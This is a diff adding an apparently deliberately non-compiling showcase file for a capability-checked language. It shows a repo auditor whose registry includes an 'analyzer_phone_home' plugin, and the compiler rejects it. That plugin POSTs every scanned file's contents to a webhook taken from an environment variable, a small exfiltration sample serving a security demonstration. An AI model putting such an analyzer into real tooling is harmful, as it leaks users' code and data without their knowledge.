@@ -1,0 +1,150 @@
+// repo_auditor_overreach.kry -- the rejected companion to repo_auditor.kry.
+//
+// Identical to repo_auditor.kry except build_registry() ALSO registers
+// analyzer_phone_home -- the untrusted, net-exfiltrating analyzer that
+// repo_auditor.kry deliberately never adds to the registry. This file is
+// MEANT to fail to compile:
+//
+//   kryos check examples/showcase/repo_auditor_overreach.kry
+//   kryos check --strict-capabilities examples/showcase/repo_auditor_overreach.kry
+//   kryos run examples/showcase/repo_auditor_overreach.kry
+//   kryos build --release examples/showcase/repo_auditor_overreach.kry
+//
+// All four fail identically (exit 1), both enforcement modes, both
+// backends, with this exact error (live-verified 2026-08-16):
+//
+//   error[E0507]: function `analyzer_phone_home` used as a value requires
+//   capabilities [net, process] not granted here
+//    --> repo_auditor_overreach.kry:104:57
+//    104 |     reg = push(reg, Analyzer { name: "phone_home", run: analyzer_phone_home })  // FORBIDDEN
+//        |                                                         ^^^^^^^^^^^^^^^^^^^ delegates its authority
+//    = note: referencing `analyzer_phone_home` as a value hands out its
+//      authority; add `@capabilities(net, process)` to the enclosing function
+//
+// The rejection fires at the point the untrusted closure is stored into the
+// registry (inside build_registry, which only declares fs:read) -- the
+// compiler does not need to see it dispatched through the deny!(net:http)
+// loop in main to catch it; referencing a privileged function BY NAME as a
+// first-class value is itself charged to the enclosing function.
+
+use std::fs::{walk_dir, exists}
+use std::http::{post}
+
+struct Finding {
+    analyzer: str,
+    file: str,
+    message: str
+}
+
+struct Analyzer {
+    name: str,
+    run: fn(str, str) -> [str]
+}
+
+// ---- Analyzer 1: pure. Flags files over a line budget. ----
+fn analyzer_line_count(path: str, content: str) -> [str] {
+    let lines = split(content, "
+")
+    let n = len(lines)
+    let mut out: [str] = []
+    if n > 400 {
+        out = push(out, "file has " + to_string(n) + " lines (budget is 400)")
+    }
+    return out
+}
+
+// ---- Analyzer 2: pure. Scans content for TODO/FIXME markers. ----
+fn analyzer_todo_scan(path: str, content: str) -> [str] {
+    let mut out: [str] = []
+    if contains(content, "TODO") {
+        out = push(out, "contains a TODO marker")
+    }
+    if contains(content, "FIXME") {
+        out = push(out, "contains a FIXME marker")
+    }
+    return out
+}
+
+// ---- Analyzer 3: needs fs:read of its own -- cross-checks that a file
+// referencing "LICENSE" has a real LICENSE file at the repo root. ----
+@capabilities(fs:read)
+fn analyzer_license_ref(path: str, content: str) -> [str] {
+    let mut out: [str] = []
+    if contains(content, "LICENSE") {
+        if not exists("LICENSE") {
+            out = push(out, "references LICENSE but no LICENSE file exists at repo root")
+        }
+    }
+    return out
+}
+
+// ---- Analyzer 4: UNTRUSTED. Would exfiltrate file content to a webhook.
+// Declared honestly -- it needs net (send the report) and process (read the
+// endpoint out of the environment). In repo_auditor.kry this is NEVER added
+// to the registry. Here it IS -- see the FORBIDDEN line in build_registry
+// below, and the quoted error at the top of this file.
+@capabilities(net, process)
+fn analyzer_phone_home(path: str, content: str) -> [str] {
+    let endpoint = env_get("AUDIT_WEBHOOK")
+    post(endpoint, content)
+    return ["reported " + path + " to " + endpoint]
+}
+
+// ---- Registry: the plugin dispatch table. Needs fs:read itself, because
+// referencing analyzer_license_ref BY NAME as a first-class value hands out
+// its authority to whoever calls build_registry -- this line alone is fine.
+// The NEXT line is not: registering analyzer_phone_home hands out [net,
+// process], which build_registry never declared. THIS IS THE REJECTED LINE.
+@capabilities(fs:read)
+fn build_registry() -> [Analyzer] {
+    let mut reg: [Analyzer] = []
+    reg = push(reg, Analyzer { name: "line_count", run: analyzer_line_count })
+    reg = push(reg, Analyzer { name: "todo_scan", run: analyzer_todo_scan })
+    reg = push(reg, Analyzer { name: "license_ref", run: analyzer_license_ref })
+    reg = push(reg, Analyzer { name: "phone_home", run: analyzer_phone_home })  // FORBIDDEN
+    return reg
+}
+
+@capabilities(fs:read)
+fn main() {
+    let argv = args()
+    let root: str = if len(argv) >= 2 { argv[1] } else { "." }
+    println("repo_auditor: scanning " + root)
+    println("")
+
+    let registry = build_registry()
+    let paths = walk_dir(root)
+    let mut findings: [Finding] = []
+
+    deny!(net:http) {
+        let mut i = 0
+        while i < len(paths) {
+            let path = paths[i]
+            if ends_with(path, ".kry") {
+                let content = file_read(path)
+                let mut j = 0
+                while j < len(registry) {
+                    let a = registry[j]
+                    let msgs = a.run(path, content)
+                    let mut k = 0
+                    while k < len(msgs) {
+                        findings = push(findings, Finding { analyzer: a.name, file: path, message: msgs[k] })
+                        k = k + 1
+                    }
+                    j = j + 1
+                }
+            }
+            i = i + 1
+        }
+    }
+
+    println("findings:")
+    let mut m = 0
+    while m < len(findings) {
+        let f = findings[m]
+        println("  [" + f.analyzer + "] " + f.file + ": " + f.message)
+        m = m + 1
+    }
+    println("")
+    println(to_string(len(findings)) + " findings across " + to_string(len(paths)) + " entries")
+}
